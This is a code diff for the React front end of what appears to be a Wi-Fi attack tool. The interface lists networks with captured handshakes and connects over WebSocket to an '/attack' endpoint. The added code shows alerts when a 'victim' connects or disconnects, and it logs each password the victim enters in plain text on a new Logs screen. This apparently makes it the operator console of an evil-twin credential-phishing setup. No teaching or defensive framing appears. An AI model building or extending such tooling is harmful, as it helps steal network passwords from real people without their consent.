@@ -5,11 +5,14 @@ import NavSlider from "./components/ui/nav-slider"
 import NetworkScreen from "./screens/NetworkScreen"
 import { Button } from "./components/ui/button"
 import SetupScreen from "./screens/SetupScreen"
+import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle, SheetTrigger } from "./components/ui/sheet"
+import LogsScreen from "./screens/LogsScreen"
 
 function App() {
 	const [networks, setNetworks] = useState<network[] | null>(null)
 	const [networksWithHandshakes, setnetworksWithHandshakes] = useState<network[]>([])
 	const [section, setSection] = useState<number>(0)
+	const [logs, setLogs] = useState<string[]>([])
 	const ws = useRef<WebSocket | null>(null)
 	const connected = useRef<boolean>(false)
 	const initialConnection = useRef<boolean>(true)
@@ -18,7 +21,7 @@ function App() {
 		let style: any = notifyStyle
 		style.style["textAlign"] = "center"
 		try {
-			ws.current = new WebSocket("ws://172.0.0.1:81")
+			ws.current = new WebSocket("ws://172.0.0.1:81/attack")
 			ws.current.onopen = () => {
 				connected.current = true
 				initialConnection.current = false
@@ -31,11 +34,26 @@ function App() {
 			}
 
 			ws.current.onmessage = (event) => {
-				if (event.data === "pong") {
-					setTimeout(() => {
-						ws.current?.send("ping")
-					}, 10000)
+				if (event.data === "Victim connected") {
+					setLogs((prev) => [...prev,"Victim connected"]);
+					return toast.success("Victim connected")
 				}
+				if (event.data === "Victim disconnected") {
+					setLogs((prev) => [...prev, "Victim disconnected"]);
+					return toast.error("Victim disconnected")
+				}
+				const data = JSON.parse(event.data)
+				if (data.type === "password") {
+					setLogs((prev) => [...prev, "Victim entered password : " + data.password]);
+					return toast.success("Victim entered password");
+				}
+				if (data.type === "message") {
+					setLogs((prev) => [...prev, data.message]);
+					return
+				}
+				setLogs((prev) => {
+                    return [...prev, data];
+                  });
 			}
 			ws.current.onclose = () => {
 				if (initialConnection.current) {
@@ -121,7 +139,6 @@ function App() {
 			})
 		}
 		for (let i in datas.handshakes) {
-			console.log(datas.handshakes[i].ssid)
 			let newNetwork: network = {
 				ssid: datas.handshakes[i].ssid,
 				bssid: datas.handshakes[i].dstAddress,
@@ -159,7 +176,7 @@ function App() {
 						<NavSlider
 							activeNav={section}
 							setActiveNav={setSection}
-							children={["Networks", "Setup"]}
+							children={["Networks", "Setup","Logs"]}
 						/>
 						{section === 0 ? (
 							<>
@@ -171,13 +188,15 @@ function App() {
 										setSection(0)
 										fetchData()
 									}}
-								>
+									>
 									Refresh
 								</Button>
 							</>
-						) : (
+						) : section === 1 ? (
 							<SetupScreen networks={networksWithHandshakes} />
-						)}
+						) : 
+						<LogsScreen logs={logs} setLogs={setLogs}/>
+						}
 					</>
 				) : (
 					<div className="loading">
